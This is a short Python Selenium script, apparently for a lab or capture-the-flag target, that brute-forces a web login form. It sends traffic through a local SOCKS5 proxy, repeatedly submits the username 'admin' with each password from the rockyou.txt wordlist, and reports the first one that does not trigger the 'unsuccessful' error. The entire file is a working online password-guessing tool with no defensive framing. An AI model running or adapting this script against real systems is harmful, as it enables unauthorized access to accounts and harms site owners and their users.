#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
import time
from selenium.webdriver.common.by import By

options = webdriver.ChromeOptions()
proxy = '127.0.0.1:1080'
options.add_argument('--proxy-server=socks5://' + proxy)

host = 'http://10.10.10.10/loginurl.html'
file = 'rockyou.txt'

input_field_id = 'Password'
login_button_id = 'btn-login'

invalid_id = 'validation-summary-errors'
invalid_string = 'unsuccessful'

driver = webdriver.Chrome(options=options,service=ChromeService(ChromeDriverManager().install()))

# get website
driver.get(host)

#wait for site to load properly
time.sleep(5)

#find  input field
pwinput = driver.find_element(By.ID, input_field_id)
userinput = driver.find_element(By.ID,"UsernameOrEmail")

#open file, rockyou is weird with encodings
f = open(file,encoding='latin-1')
for line in f.readlines():

    userinput = driver.find_element(By.ID,"UsernameOrEmail")
    pwinput = driver.find_element(By.ID, input_field_id)

    pwinput.clear()
    userinput.clear()

    userinput.send_keys("admin")

    #input string
    line = line.strip()
    pwinput.send_keys(line)

    loginbutton = driver.find_element(By.CLASS_NAME,login_button_id)

    #click button
    loginbutton.click()

    #check incorrect or not
    result = driver.find_element(By.CLASS_NAME, invalid_id)

    if invalid_string in result.text:
        print(line + " INVALID")
    else:
        print(line + " *****************SUCCESS**************")
        break






